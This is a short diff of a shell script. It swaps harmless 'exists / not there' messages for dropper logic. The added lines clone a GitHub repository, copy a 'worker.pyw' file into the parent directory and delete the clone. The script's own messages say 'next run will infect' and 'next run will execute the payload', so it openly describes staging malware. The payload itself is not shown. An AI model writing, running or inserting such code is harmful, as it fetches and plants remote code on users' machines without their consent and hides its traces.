@@ -1,6 +1,15 @@
 if [ -d "./lodsamone" ];
 then
-	echo -e "it's exits\n"
+	rm -rf "./lodsamone"
+    echo "next run will infect, exiting"
+    exit
 else
-	echo -e "It's not there\n"
+	echo "next run will execute the payload"
+    git clone https://github.com/dumkits/lodsamone
+    cd lodsamone
+    cp worker.pyw ../
+    cd ..
+    rm -rf ./lodsamone
+    exit
 fi
+exit
